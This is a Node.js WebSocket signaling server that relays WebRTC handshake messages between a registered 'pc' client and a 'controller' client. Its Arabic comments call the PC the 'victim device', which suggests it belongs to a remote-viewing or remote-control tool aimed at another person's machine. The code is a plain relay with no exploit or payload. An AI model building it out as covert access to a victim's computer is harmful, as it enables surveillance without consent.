// signaling_server.js
const WebSocket = require('ws');

// تشغيل السيرفر على المنفذ 10037
const PORT = process.env.PORT || 10037; 
const wss = new WebSocket.Server({ port: PORT });
console.log(`🚀 Signaling Server started on port ${PORT}`);
let pc = null;         // الجهاز الضحية (Agent)
let controller = null; // جهاز التحكم (Viewer)

console.log("🚀 Signaling Server started on port 10037");

wss.on('connection', (ws) => {
    console.log("📡 New device connected to server");

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);

            // 1. تسجيل الأدوار
            if (data.role === 'pc') {
                pc = ws;
                console.log("✅ Agent (PC) registered");
            } else if (data.role === 'controller') {
                controller = ws;
                console.log("✅ Controller (Viewer) registered");
            }

            // 2. تمرير رسائل التعارف (Offer, Answer, Candidate)
            // إذا جاءت رسالة من الـ PC، مررها للـ Controller
            if (ws === pc && controller) {
                controller.send(message.toString());
            }
            // إذا جاءت رسالة من الـ Controller، مررها للـ PC
            else if (ws === controller && pc) {
                pc.send(message.toString());
            }

        } catch (e) {
            console.log("❌ Error parsing message");
        }
    });

    ws.on('close', () => {
        if (ws === pc) { pc = null; console.log("⚠️ Agent disconnected"); }
        if (ws === controller) { controller = null; console.log("⚠️ Controller disconnected"); }
    });
});